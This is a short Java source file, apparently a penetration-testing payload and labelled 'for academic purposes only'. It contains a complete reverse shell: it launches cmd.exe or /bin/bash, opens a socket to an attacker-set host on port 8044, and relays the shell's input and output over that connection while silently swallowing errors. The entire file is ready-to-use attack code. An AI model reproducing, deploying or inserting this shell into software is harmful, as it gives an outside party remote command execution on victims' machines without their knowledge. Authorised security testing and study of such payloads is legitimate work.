
import java.net.Socket;
import java.io.InputStream;
import java.io.OutputStream;


/*
 * Copyright 2018 cornerpirate.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * For academic purposes only.
 * 
 * This reverse shell is based pretty much on this gist:
 * 
 *   https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
 *
 * @author cornerpirate
 */
public class payload {

    /**
     * This method is called when the payload is compiled and executed. I am
     * showing a reverse shell.
     */
    public void revshell() {

        try {

            // IP address or hostname of attacker
            String attacker = "SETME";
            int port = 8044;
            // For a windows target do this. For linux "/bin/bash"
            String cmd = "cmd.exe";
            // The rest creates a new process
            // Establishes a socket to the attacker
            // Then redirects the stdin, stdout and stderr to the port.
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(attacker, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            // read all input and output forever.
            while (!s.isClosed()) {
                while (pi.available() > 0) {
                    so.write(pi.read());
                }
                while (pe.available() > 0) {
                    so.write(pe.read());
                }
                while (si.available() > 0) {
                    po.write(si.read());
                }
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {
                }
            };
            p.destroy();
            s.close();
        } catch (Exception ex) {
            // Ignore errors as we are doing naughty things anyway.
        }

    }
}
